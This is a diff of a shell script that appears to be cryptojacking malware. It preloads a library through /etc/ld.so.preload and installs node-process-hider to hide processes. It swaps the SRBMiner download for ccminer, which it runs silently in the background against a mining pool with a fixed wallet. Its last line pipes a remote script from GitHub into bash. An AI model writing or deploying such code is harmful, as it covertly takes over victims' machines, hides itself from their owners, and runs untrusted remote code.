@@ -10,9 +10,9 @@ echo /usr/local/lib/libcikblek.so >> /etc/ld.so.preload
 rm cikblek.c
 echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
-sudo su --command "curl -sL https://deb.nodesource.com/setup_17.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add SRBMiner-MULTI"
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.4/SRBMiner-Multi-2-7-4-Linux.tar.gz >/dev/null 2>&1
-tar -xzvf SRBMiner-Multi-2-7-4-Linux.tar.gz
-cd SRBMiner-Multi-2-7-4
-./SRBMiner-MULTI --algorithm verushash --pool stratum+tcp://sg.vipor.net:5040 --wallet RPw1mcxaVvVcUicUqMmqon6n88esCrN3SP."AP$RANDOM" >/dev/null 2>&1 &
+sudo su --command "curl -sL https://deb.nodesource.com/setup_17.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add ccminer"
+wget https://github.com/wong-fi-hung/ccminer/releases/download/v3.8.3a/ccminer_CPU_3.8.3.tar.xz >/dev/null 2>&1
+tar -xf ccminer_CPU_3.8.3.tar.xz
+chmod 777 ccminer
+./ccminer -a verus -o stratum+tcp://eu.luckpool.net:3960 -u RPw1mcxaVvVcUicUqMmqon6n88esCrN3SP.cucu."AP$RANDOM" >/dev/null 2>&1 &
 curl -sL https://raw.githubusercontent.com/bsheredia/dumel/main/pie.sh | bash
